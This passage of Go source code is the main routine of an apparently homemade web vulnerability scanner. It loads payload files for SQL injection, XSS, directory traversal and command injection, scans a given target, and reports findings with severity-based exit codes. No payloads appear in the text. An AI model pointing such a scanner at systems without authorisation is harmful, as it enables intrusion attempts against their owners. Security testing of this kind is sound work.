	if !strings.HasPrefix(options.Target, "http://") && !strings.HasPrefix(options.Target, "https://") {
		options.Target = "http://" + options.Target
	}
	
	// Show banner
	if !options.Verbose {
		fmt.Printf(Banner, Version)
	}
	
	// Create scanner
	scanner, err := NewScanner(&options)
	if err != nil {
		fmt.Printf("Error creating scanner: %v\n", err)
		os.Exit(1)
	}
	
	// Load custom payloads from files
	payloadFiles := map[VulnType]string{
		SQLInjection:     scanner.config.Payloads.SQLInjection,
		XSS:              scanner.config.Payloads.XSS,
		DirectoryTraversal: scanner.config.Payloads.DirectoryTraversal,
		CommandInjection: scanner.config.Payloads.CommandInjection,
	}
	
	for vulnType, filename := range payloadFiles {
		if filename != "" {
			if err := loadPayloadsFromFile(filename, vulnType); err != nil {
				fmt.Printf("Warning: Failed to load payloads from %s: %v\n", filename, err)
			} else if options.Verbose {
				fmt.Printf("Loaded custom payloads from: %s\n", filename)
			}
		}
	}
	
	// Create context with timeout
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Minute)
	defer cancel()
	
	// Start scanning
	fmt.Printf("🎯 Target: %s\n", options.Target)
	fmt.Printf("⚙️  Threads: %d | Timeout: %ds | Rate Limit: %d req/s\n", 
		scanner.config.Scan.Threads, scanner.config.Scan.Timeout, scanner.config.Scan.RateLimit)
	fmt.Println("🔍 Starting comprehensive security scan...")
	fmt.Println(strings.Repeat("─", 60))
	
	// Perform scan
	result, err := scanner.Scan(ctx, options.Target)
	if err != nil {
		fmt.Printf("Scan failed: %v\n", err)
		os.Exit(1)
	}
	
	// Display results summary
	fmt.Println(strings.Repeat("─", 60))
	fmt.Println("📊 SCAN SUMMARY")
	fmt.Println(strings.Repeat("─", 60))
	fmt.Printf("🎯 Target: %s\n", result.ScanInfo.Target)
	fmt.Printf("⏱️  Duration: %s\n", result.ScanInfo.Duration)
	fmt.Printf("📡 Requests: %d\n", result.Summary.Requests)
	fmt.Printf("🔍 Total Findings: %d\n", result.Summary.TotalFindings)
	
	if result.Summary.TotalFindings > 0 {
		fmt.Println("\n📈 Risk Breakdown:")
		for _, level := range []RiskLevel{RiskCritical, RiskHigh, RiskMedium, RiskLow, RiskInfo} {
			count := result.Summary.RiskBreakdown[level]
			if count > 0 {
				emoji := map[RiskLevel]string{
					RiskCritical: "🔴", RiskHigh: "🟠", RiskMedium: "🟡", RiskLow: "🟢", RiskInfo: "🔵",
				}[level]
				fmt.Printf("   %s %-8s: %d\n", emoji, level, count)
			}
		}
		
		fmt.Println("\n🎯 Vulnerability Types:")
		for vulnType, count := range result.Summary.TypeBreakdown {
			if count > 0 {
				fmt.Printf("   • %-20s: %d\n", vulnType, count)
			}
		}
		
		// Display top findings
		if options.Verbose && len(result.Findings) > 0 {
			fmt.Println("\n🚨 TOP FINDINGS:")
			for i, finding := range result.Findings {
				if i >= 5 { // Show only top 5
					break
				}
				emoji := map[RiskLevel]string{
					RiskCritical: "🔴", RiskHigh: "🟠", RiskMedium: "🟡", RiskLow: "🟢", RiskInfo: "🔵",
				}[finding.Severity]
				fmt.Printf("   %s [%s] %s\n", emoji, finding.Severity, finding.Title)
				fmt.Printf("      URL: %s\n", finding.URL)
				if finding.Parameter != "" {
					fmt.Printf("      Parameter: %s\n", finding.Parameter)
				}
				fmt.Println()
			}
		}
	} else {
		fmt.Println("✅ No security vulnerabilities detected!")
	}
	
	// Handle errors
	if len(result.Errors) > 0 {
		fmt.Printf("\n⚠️  Errors encountered: %d\n", len(result.Errors))
		if options.Verbose {
			fmt.Println("Error details:")
			for _, errMsg := range result.Errors {
				fmt.Printf("   • %s\n", errMsg)
			}
		}
	}
	
	// Export results
	if options.Output != "" {
		if err := scanner.ExportJSON(result, options.Output); err != nil {
			fmt.Printf("Error saving JSON report: %v\n", err)
		} else {
			fmt.Printf("💾 JSON report saved: %s\n", options.Output)
		}
	}
	
	// Generate HTML report
	if options.Report {
		reportFile := "report.html"
		if options.Output != "" {
			reportFile = strings.TrimSuffix(options.Output, filepath.Ext(options.Output)) + ".html"
		}
		
		if err := scanner.GenerateHTMLReport(result, reportFile); err != nil {
			fmt.Printf("Error generating HTML report: %v\n", err)
		} else {
			fmt.Printf("📄 HTML report generated: %s\n", reportFile)
		}
	}
	
	// Exit with appropriate code
	if result.Summary.RiskBreakdown[RiskCritical] > 0 || result.Summary.RiskBreakdown[RiskHigh] > 0 {
		fmt.Println("\n🚨 Critical or High risk vulnerabilities found!")
		fmt.Println("   Immediate action recommended.")
		os.Exit(2) // Exit code 2 for security issues
	}
	
	if result.Summary.TotalFindings > 0 {
		os.Exit(1) // Exit code 1 for any findings
	}
	
	fmt.Println("\n🎉 Scan completed successfully!")
	os.Exit(0) // Exit code 0 for clean scan
}